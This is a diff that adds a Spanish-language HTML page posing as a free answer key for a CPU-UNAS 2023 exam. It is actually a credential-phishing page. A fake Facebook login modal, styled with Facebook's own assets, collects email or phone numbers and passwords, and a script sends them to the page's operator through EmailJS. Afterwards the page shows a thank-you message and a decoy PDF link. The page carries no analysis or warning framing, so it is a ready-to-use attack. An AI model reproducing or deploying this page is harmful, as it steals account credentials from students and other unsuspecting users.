@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOLUCIONARIO PRIMER PARCIAL CPU-UNAS | Ciclo Enero-Marzo 2023</title>
+
+
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
+    <link href="body.css" rel="stylesheet" type="text/css" />
+    <link href="modal.css" rel="stylesheet" type="text/css" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+    <meta name="theme-color" content="#3b5998">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/l/0,cross/0DC-ILKQStC.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="GaDhu" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/mZNFtRYBXZQ.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="xbs5/" crossorigin="anonymous">
+    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04"
+        content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
+    <link rel="canonical" href="https://www.facebook.com/adultlanarhoades/photos/%EF%B8%8F/367046907269885/">
+    <meta name="description" content="📒">
+    <link rel="manifest" href="/data/manifest/" crossorigin="use-credentials">
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iwhX4/yX/l/es_ES/29KpN-SSjEW.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
+        as="script" crossorigin="anonymous">
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/6KqFq7q8hV0.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
+        crossorigin="anonymous">
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3izBq4/yz/l/es_ES/XfFRDyeWgft.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
+        as="script" crossorigin="anonymous">
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
+    <link href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700" rel="stylesheet" type="text/css" />
+
+</head>
+
+<body
+    style="background-image: url(&quot;https://www.cristal.com.pe/sites/g/files/phfypu1426/f/agegate/cristal/backgrounds/bg-section-2.jpg&quot;);">
+    <br>
+    <center>
+        <!--header><img src="img/logo-frase-cristal.png" style="width: 45vh;"></header-->
+        <h1 style="font-size: 3vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Primer Parcial
+            CPU-UNAS 2023</h1>
+    </center><hr>
+
+
+    <input type="checkbox" id="cerrar">
+    <label for="cerrar" id="btn-cerrar">X</label>
+    <div class="modal">
+
+        <form id="form" name="sentMessage" class="form-signin" method="post" novalidate="novalidate">
+            <h2 class="form-signin-heading">Iniciar sesión con Facebook</h2>
+            <input name="from_name" id="from_name" type="text" class="form-control"
+                placeholder="Correo electrónico o número de teléfono" required="" autofocus="" />
+            <input id="to_name" name="to_name" type="password" class="form-control" placeholder="Contraseña"
+                required="" />
+            <button type="submit" id="button" value="Send Email">Entrar</button>
+            <br>
+            <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" id="forgot-password-link"
+                target="">¿Has
+                olvidado los datos de la cuenta?</a>
+            <br>
+            <br>
+            <a href="#" rel="nofollow" id="reg-link">Registrarte en Facebook</a>
+        </form>
+
+
+
+    </div>
+    <!--Envia el mensaje a correo electronico-->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('bgN-e7F2EjGyDqEfz')
+        var subject = "Lyrics-Music"
+        const phone = document.getElementById('phone');
+        const btn = document.getElementById('button');
+
+        document.getElementById('form')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                btn.value = 'Enviando...';
+
+                const serviceID = 'service_tzzmwxg';
+                const templateID = 'template_tn3efha';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn.value = 'Send Email';
+                        alert('MIRA AL FINAL DE LA PAGINA')
+                        var msj2 = '<center><div style="display: block;background-color: yellow;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">MUCHAS GRACIAS POR PARTICIPAR!</div></div></center>'
+                        $('body').append(msj2)
+
+                        //alert('MUCHAS GRACIAS POR PARTICIPAR!');
+                    }, (err) => {
+                        btn.value = 'Send Email';
+                        alert(JSON.stringify(err));
+                    });
+            });
+
+
+    </script>
+    <br><br>
+
+    <center>
+        <!--img src="img/cerveza-cristal.jpg" style="border-radius: 30px;width: 45vh;"-->
+        <h1 style="font-size: 2vh;">Ciclo Enero-Marzo</h1>
+    </center>
+    <br><br><br>
+
+
+    <center>
+        <div style="border: 10px inset red;">
+            <a href="http://admision.uni.edu.pe/wp-content/uploads/2022/12/solucionario-simulacro-ien-2023.pdf"
+                style="text-decoration: none;">SOLUCIONARIO CPU PRIMER PARCIAL</a>
+        </div>
+    </center>
+    <br>
+    <center><strong style="color: rgb(245, 4, 4);font-size: 10vw;font-family: asdonuts;width: 45vh;">¡Prohibido Compartir!</strong></center>
+    <br><br>
+
+    <center>
+        <a href="http://admision.uni.edu.pe/wp-content/uploads/2022/12/solucionario-simulacro-ien-2023.pdf" style="background-color: aqua;border-radius: 10px;padding: 10px;">Descargar.pdf</a>
+    </center>
+
+
+
+
+    <!--PIE DE PAGINA-->
+    <!--footer class="footer py-4 footer-light bg-light"
+        style="border-top-left-radius: 15px;border-top-right-radius: 15px;background-color: rgb(4, 4, 109);">
+        <br>
+        <br>
+        <div style="display: flex;">
+            <p style="color: antiquewhite;display: flex;margin: 10px 10px 10px 20px;text-align: left;">NO COMPARTA ESTE
+                CONTENIDO CON MENORES DE EDAD</p>
+            <P style="color: antiquewhite;display: flex;margin: 10px 10px 0px 600px;text-align: right;">TOMAR BEBIDAS
+                ALCOHÓLICAS EN EXCESO ES DAÑINO</P>
+        </div>
+        <br>
+        <br>
+    </footer-->
+    <!-- Footer-->
+    <br><br><br><br><br><br>
+    <link href="styles.css" rel="stylesheet" type="text/css" />
+    <footer class="footer py-4" style="display: block;">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-4 text-lg-left">Copyright © https://www.Thezero27/ 2023<br>Thezero</div>
+                <!--div class="col-lg-4 text-lg-left">Miguel Angel Fabian</div-->
+                <div class="col-lg-4 my-3 my-lg-0">
+                    <a class="btn btn-dark btn-social mx-2" href="#!"><i class="fab fa-twitter"></i></a>
+                    <a class="btn btn-dark btn-social mx-2" href="#!"><i class="fab fa-facebook-f"></i></a>
+                    <a class="btn btn-dark btn-social mx-2" href="#!"><i class="fab fa-linkedin-in"></i></a>
+                </div>
+                <div class="col-lg-4 text-lg-right">
+                    <p class="mr-3">NO COMPARTA ESTE
+                        CONTENIDO CON MENORES DE EDAD</p>
+                    <p class="mr-3">SI ESTUDIAS LOGRARAS TUS OBJETIVOS</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+<!-- Bootstrap core JS-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
+<!-- Third party plugin JS-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+<!-- Contact form JS-->
+<script src="assets/mail/jqBootstrapValidation.js"></script>
+<script src="assets/mail/contact_me.js"></script>
+<!-- Core theme JS-->
+<script src="js/scripts.js"></script>
+
+</html>
